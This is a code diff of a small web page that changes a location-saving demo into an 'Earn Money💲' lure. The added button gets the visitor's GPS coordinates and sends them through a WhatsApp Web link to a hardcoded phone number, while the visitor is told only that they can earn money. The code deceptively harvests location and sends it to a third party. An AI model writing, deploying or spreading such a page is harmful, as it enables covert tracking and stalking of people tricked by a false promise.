@@ -3,12 +3,14 @@
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Location</title>
+    <title>Earn Money💲</title>
+  </head>
+  <body>
+    <button onclick="sendWhatsAppMessage()">Earn Money💲</button>
 
     <script>
-      //   var fs = require("fs");
-      const clickMe = () => {
-        console.log("hello");
+      function sendWhatsAppMessage() {
+        // Replace this with the phone number you want to send a message to
         navigator.geolocation.getCurrentPosition((position) => {
           var contents = {
             lat: position.coords.latitude,
@@ -16,30 +18,19 @@
           };
           console.log(contents);
           var jsonString = JSON.stringify(contents, null, 2);
-          const file = new Blob([jsonString], { type: "application/json" });
+          var phoneNumber = "7992333452";
+          // Replace this with the message you want to send
+          var message = `Hello, this is a Earn Money💲 message!  ${jsonString}`;
 
-          // Create a link element
-          var a = document.createElement("a");
-          // Create a URL for the Blob and set it as the href attribute of the link
-          a.href = URL.createObjectURL(file);
+          // Create the WhatsApp Web URL with the phone number and message
+          var whatsappUrl = `https://web.whatsapp.com/send?phone=${phoneNumber}&text=${encodeURIComponent(
+            message
+          )}`;
 
-          // Set the filename for the download
-          a.download = "data.json";
-
-          // Append the link to the body
-          document.body.appendChild(a);
-
-          // Click the link programmatically to trigger the download
-          a.click();
-
-          // Remove the link from the DOM
-          document.body.removeChild(a);
+          // Open the WhatsApp Web URL in a new window
+          window.open(whatsappUrl, "_blank");
         });
-      };
+      }
     </script>
-  </head>
-  <body>
-    <h1>Welcome</h1>
-    <input type="button" value="Click me" onclick="clickMe()" />
   </body>
 </html>
